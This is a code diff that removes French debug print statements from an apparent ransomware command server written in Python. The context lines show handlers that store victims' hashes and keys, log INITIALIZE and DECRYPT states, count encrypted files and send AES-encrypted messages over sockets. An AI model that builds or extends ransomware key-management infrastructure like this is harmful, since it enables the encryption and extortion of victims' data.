@@ -70,7 +70,6 @@ def get_data_from_db(message_console, conn):
 
 
 def handle_initialize(message_console, conn):
-    print('Hello serveur clé')
     select_query = "SELECT hash, key FROM victims;"
     victims = data.select_data(conn, select_query)
     hash_victim = message_console["INITIALIZE"]
@@ -97,7 +96,6 @@ def handle_initialize(message_console, conn):
         contenu_state = [1, len(victims) + 1, datetime.datetime.now().timestamp(), "INITIALIZE"]
         data.insert_data(conn, "states", items_state, contenu_state)
         front_thread_queue.put(message.set_message("KEY_RESP", [hash_victim, key, "INITIALIZE"]))
-        print("Coucou c envoyé")
 
 
 def handle_pending_signal(message_console, conn):
@@ -133,7 +131,6 @@ def handle_decrypt(message_console, conn):
     front_thread_queue.put(message.set_message("DECRYPT", [victim_hash, nb_files_encrypt, key_victim]))
     data.insert_data(conn, "states", ["id_states", "id_victim", "datetime", "state"],
                      [4, victim_id, datetime.datetime.now().timestamp(), "DECRYPT"])
-    print("Message inséré dans la queue front_thread_queue")
 
 
 def handle_protectreq(message_console, conn):
@@ -186,7 +183,6 @@ def handle_frontal(socket_server_frontal):
     while True:
         try:
             encrypted_message_frontal = network.receive_message(client_socket)
-            print("hello ii")
             if encrypted_message_frontal is not None:
                 message_frontal = security.aes_decrypt(encrypted_message_frontal, key)
                 main_queue.put((message_frontal, client_socket, key))
